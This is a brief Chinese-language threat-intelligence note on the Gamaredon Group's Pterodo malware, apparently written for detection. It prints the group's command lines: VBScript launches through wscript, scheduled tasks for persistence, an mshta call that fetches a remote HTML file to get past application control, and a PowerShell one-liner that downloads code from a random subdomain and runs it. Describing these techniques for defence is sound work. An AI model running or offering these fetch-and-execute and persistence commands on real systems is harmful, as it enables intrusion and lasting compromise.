# Gamaredon Group

## 特征

1. depended.exe负载会执行两个VBS脚本:

> "CSIDL_SYSTEM\wscript.exe" CSIDL_PROFILE\appdata\roaming\reflect.rar //e:VBScript //b

>	"CSIDL_SYSTEM\wscript.exe" CSIDL_PROFILE\appdata\local\temp\deep-thoughted. //e:VBScript //b

然后会创建计划任务来确保持久性SCHTASKS /CREATE /sc minute /mo 10 /tn "deep-thoughted" /tr "wscript.exe " CSIDL_COMMON_PICTURES\deep-thoughted.ppt //e:VBScript //b" /F，该计划任务每10分钟运行一次.
当然，该组织也会使用MSHTA来绕过应用程序控制策略:"CSIDL_SYSTEM\cmd.exe" /c CSIDL_SYSTEM\mshta.exe http://域名/FILM.html /f id=[REDACTED].

2. 投递的Pterodo恶意软件活跃时将会通过其他的命令控制器下载脚本和工具，然后创建计划任务.

```bash
"CSIDL_SYSTEM\wscript.exe" CSIDL_PROFILE\appdata\local\temp\12382. //e:VBScript //b
"CSIDL_SYSTEM\cmd.exe" /c CSIDL_SYSTEM\mshta.exe http://域名/7-ZIP.html /f id=<?,?>
CSIDL_SYSTEM\mshta.exe http://域名/7-ZIP.html /f id=<?,?>
//MSHTA执行绕过
"CSIDL_SYSTEM\schtasks.exe" /CREATE /sc minute /mo 12 /tn "MediaConverter" /tr "wscript.exe " CSIDL_COMMON_MUSIC\mediatv.mov //e:VBScript //b " /F"
"CSIDL_SYSTEM\schtasks.exe" /CREATE /sc minute /mo 12 /tn "VideoHostName" /tr "wscript.exe " CSIDL_COMMON_VIDEO\videotv.m3u //e:VBScript //b " /F"
//每12分钟执行
```

3. 恶意软件经常以随机子域作为命令控制器.

```powershell
"powershell.exe" $tmp = $ (New-object net.webclient) .DownloadString('http://'+[System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.域名')+'/get.php');Invoke-Expression $tmp
```
